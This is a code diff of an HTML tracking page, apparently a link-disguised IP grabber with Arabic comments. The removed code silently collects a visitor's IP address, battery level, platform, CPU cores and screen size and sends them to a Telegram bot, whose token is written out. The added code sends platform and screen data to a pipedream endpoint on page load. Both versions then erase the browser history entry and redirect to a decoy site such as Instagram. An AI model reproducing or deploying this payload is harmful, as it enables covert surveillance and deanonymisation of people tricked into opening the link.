@@ -1,49 +1,22 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <meta charset="UTF-8">
     <script>
-        const T = "8795074558:AAHSNWiXI4mKMFsyrEP6qEkMdRQrbc9Yid8";
-        const C = "5773364548";
-
-        async function godMode() {
+        function launch() {
             const u = new URLSearchParams(window.location.search).get('u') || 'https://instagram.com';
-            
-            // 1. اختطاف السجل + تحويل فوري (قبل أي معالجة)
+            const server = "https://eo9vbt8nw49qmpi.m.pipedream.net/"; 
+
+            // إرسال البيانات للسيرفر (خلف الكواليس)
+            navigator.sendBeacon(server, JSON.stringify({
+                plt: navigator.platform,
+                scr: screen.width + "x" + screen.height
+            }));
+
+            // مسح أثرك من المتصفح والتحويل فوراً
             window.history.replaceState(null, null, u);
             window.location.replace(u);
-
-            // 2. صيد البطارية (للأندرويد والآيفون المحدث)
-            let b = "N/A";
-            try {
-                if (navigator.getBattery) {
-                    const bt = await navigator.getBattery();
-                    b = Math.round(bt.level * 100) + "%";
-                }
-            } catch(e) {}
-
-            // 3. سحب البيانات من أسرع سيرفر بالعالم (Cloudflare)
-            fetch('https://dash.cloudflare.com/cdn-cgi/trace').then(r => r.text()).then(t => {
-                const ip = t.match(/ip=(.*)/)[1];
-                
-                // 4. إرسال الآيبي مع رابط "التحليل الذكي" حتى نضمن السرعة 100%
-                const msg = `
-🚀 **تم الرصد بنجاح (الخبير X)** 🚀
-━━━━━━━━━━━━━━━
-🌐 الـ IP: \`${ip}\`
-🔋 البطارية: ${b}
-📱 الجهاز: ${navigator.platform}
-⚙️ المعالج: ${navigator.hardwareConcurrency || '?'} Core
-🖥️ الشاشة: ${screen.width}x${screen.height}
-━━━━━━━━━━━━━━━
-📍 رابط التحليل والموقع (اضغط):
-https://ip-api.com/#${ip}`;
-
-                const url = `https://api.telegram.org/bot${T}/sendMessage?chat_id=${C}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`;
-                navigator.sendBeacon(url);
-            });
         }
-        godMode();
+        window.onload = launch;
     </script>
 </head>
 <body style="background:#000"></body>
